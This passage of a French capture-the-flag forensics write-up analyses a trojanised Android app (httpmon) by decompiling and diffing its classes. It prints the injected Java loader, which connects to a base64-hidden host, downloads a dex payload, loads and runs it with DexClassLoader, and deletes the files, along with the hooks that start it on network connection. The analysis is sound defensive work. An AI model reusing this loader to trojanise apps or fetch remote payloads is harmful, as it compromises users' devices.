75.* => amazon AWS
184. => amazon AWS
95.211.162.18 => LeaseWeb (Pays-Bas)
```

Ça ne nous dit pas pour autant si le pirate est passé par un relais *AWS* :(  

Mais ce que l'on sait, c'est que la victime a installé un APK qui s'est chargé d'installer un *Meterpreter*...  

Comment le pirate, en dehors de bypasser la signature, a t-il vérolé l'application originale ?  

A t-il utilisé un outil comme [Ajar](https://github.com/Atticuss/ajar) ?  

D'où venait provenait le Meterpreter s'il n'est pas présent dans le listing donné par unzip ?  

Les organisateurs du *CySCA* s'attendaient visiblement à ce que l'on utilise *smali* pour faire un [deodexing](https://code.google.com/p/smali/wiki/DeodexInstructions) des odex (fichiers dex compressé). Une opération qui nécessite effectivement le dossier framework fournit.  

De mon côté j'ai simplement eu recours à *dex2jar*.  

J'ai procédé de la façon suivante :  

Dans un premier temps j'ai extrait les deux versions du *classes.dex* depuis l'APK.  

J'ai ensuite converti chaque .dex en .jar via *dex2jar* :  

```plain
$ d2j-dex2jar.sh classes.dex
dex2jar classes.dex -> ./classes-dex2jar.jar
```

Ensuite je décompresse bêtement les deux .jar vers des dossiers différents (*v1* et *v2*).  

La commande diff permet de connaître les fichiers modifiés, ajoutés ou supprimés :  

```plain
$ diff -r v1 v2
Only in v2/org/jtb/httpmon: MonitorService$3.class
Binary files v1/org/jtb/httpmon/MonitorService.class and v2/org/jtb/httpmon/MonitorService.class differ
```

S'ensuit l'ouverture de la classe *MonitorService* dans la jar modifié depuis *JD-GUI* :  

```java
public static void checkUpdates(String[] paramArrayOfString)
{
  while (true)
  {
    int i;
    try
    {
      paramArrayOfString = new Socket(new String(Base64.decode("aHR0cG1vbi5hbmRyb2lkc2hhcmUubmV0", 0)), Integer.parseInt(new String(Base64.decode("NDQz", 0))));
      DataInputStream localDataInputStream = new DataInputStream(paramArrayOfString.getInputStream());
      DataOutputStream localDataOutputStream = new DataOutputStream(paramArrayOfString.getOutputStream());
      Object localObject3 = context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName;
      Log.w("httpmon", "Software update started for " + (String)localObject3 + ".");
      Object localObject1 = new File(".").getAbsolutePath();
      Object localObject2 = localObject1 + File.separatorChar + "UpdateService.jar";
      String str = localObject1 + File.separatorChar + "UpdateService.dex";
      Object localObject4 = new File(localObject1 + File.separatorChar).listFiles();
      if (localObject4 != null)
      {
        i = 0;
        if (i < localObject4.length);
      }
      else
      {
        localObject4 = new byte[localDataInputStream.readInt()];
        localDataInputStream.readFully((byte[])localObject4);
        localObject4 = new String((byte[])localObject4);
        if (((String)localObject4).contains((CharSequence)localObject3))
          break label531;
        byte[] arrayOfByte = new byte[localDataInputStream.readInt()];
        localDataInputStream.readFully(arrayOfByte);
        localObject3 = new File((String)localObject2);
        if (((File)localObject3).exists())
          continue;
        ((File)localObject3).createNewFile();
        FileOutputStream localFileOutputStream = new FileOutputStream((File)localObject3);
        localFileOutputStream.write(arrayOfByte);
        localFileOutputStream.flush();
        localFileOutputStream.close();
        localObject1 = new DexClassLoader((String)localObject2, (String)localObject1, (String)localObject1, MonitorService.class.getClassLoader()).loadClass((String)localObject4);
        localObject2 = ((Class)localObject1).newInstance();
        ((File)localObject3).delete();
        new File(str).delete();
        ((Class)localObject1).getMethod("start", new Class[] { DataInputStream.class, OutputStream.class, Context.class, [Ljava.lang.String.class }).invoke(localObject2, new Object[] { localDataInputStream, localDataOutputStream, context, new String[0] });
        paramArrayOfString.close();
        ((File)localObject3).delete();
        Log.w("httpmon", "Software updated successfully.");
        Log.w("httpmon", "https://play.google.com/store/apps/details?id=org.jtb.httpmon");
        return;
      }
      if ((!localObject4[i].getAbsolutePath().contains(".jar")) && (!localObject4[i].getAbsolutePath().contains(".dex")))
        break label540;
      localObject4[i].delete();
      break label540;
      ((File)localObject3).delete();
      ((File)localObject3).createNewFile();
      continue;
    }
    catch (Exception paramArrayOfString)
    {
      paramArrayOfString.printStackTrace();
      return;
    }
    label531: Log.w("httpmon", "Software currently up to date.");
    return;
    label540: i += 1;
  }
}
```

Les chaines base64 trouvées en début nous donnent le Saint Graal :  

```plain
httpmon.androidshare.net:443
```

Dans la classe il y a deux méthodes ajoutées par rapport à l'original : *updateInit* et *startAsync*.  

Un membre *context* de type *Context* a aussi été ajouté dans la classe.  

Les deux méthodes sont les suivantes :  

```java
private void startAsync()
{
  try
  {
    new AsyncTask()
    {
      protected Void doInBackground(Void[] paramAnonymousArrayOfVoid)
      {
        MonitorService.this.updateInit();
        return null;
      }
    }
    .execute(new Void[0]);
    return;
  }
  catch (Exception localException)
  {
    localException.printStackTrace();
  }
}

private void updateInit()
{
  try
  {
    System.setProperty("user.dir", getFilesDir().getAbsolutePath());
    context = this;
    checkUpdates(null);
    return;
  }
  catch (Exception localException)
  {
    localException.printStackTrace();
  }
}
```

Et la méthode modifiée faisant appel à *startAsync* :  

```java
private boolean isNetworkConnected()
{
  NetworkInfo localNetworkInfo = ((ConnectivityManager)getSystemService("connectivity")).getActiveNetworkInfo();
  if (localNetworkInfo == null)
  {
    Log.d("httpmon", "no active network");
    return false;
  }
  Log.d("httpmon", "active network, type: " + localNetworkInfo.getTypeName());
  if (!localNetworkInfo.isConnected())
  {
    Log.d("httpmon", "network is not connected, state: " + localNetworkInfo.getState());
    return false;
  }
  Log.d("httpmon", "network state is connected");
  startAsync();
  return true;
}
```

Au passage si on fouille dans le dump à la recherche de ce nom d'hôte :  

```plain
java.net.ConnectException: failed to connect to httpmon.androidshare.net/192.168.43.221 (port 443): connect failed: ETIMEDOUT (Connection timed out)
```

Terminé. Restez à l'écoute pour la solution de la partie exploitation ;-)

*Published July 03 2015 at 08:20*